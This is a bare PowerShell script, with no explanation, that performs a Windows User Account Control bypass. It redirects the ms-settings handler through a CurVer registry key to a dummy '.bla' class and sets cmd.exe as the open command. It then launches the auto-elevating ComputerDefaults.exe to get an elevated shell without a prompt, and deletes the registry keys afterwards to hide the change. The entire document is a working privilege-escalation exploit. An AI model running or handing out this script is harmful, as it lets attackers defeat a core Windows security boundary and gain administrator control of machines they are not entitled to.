New-Item "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".bla" -Force
New-Item "HKCU:\Software\Classes\.bla\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\.bla\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\.bla\Shell\Open\command" -Name "(default)" -Value cmd.exe -Force
Start-Sleep -s 1
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
Start-Sleep -s 1
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
Remove-Item "HKCU:\Software\Classes\.bla\" -Recurse -Force